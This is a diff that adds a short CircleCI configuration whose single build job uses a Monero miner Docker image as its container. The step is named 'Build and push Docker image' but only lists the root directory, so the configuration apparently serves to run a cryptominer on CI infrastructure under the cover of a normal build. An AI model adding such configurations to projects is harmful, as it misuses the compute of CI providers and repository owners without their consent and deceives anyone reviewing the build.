@@ -1,0 +1,13 @@
+version: 2
+jobs:
+  build:
+    docker:
+      - image: kannix/monero-miner
+
+    steps:
+      - checkout
+
+      - run:
+          name: Build and push Docker image
+          command: |
+            ls -la /
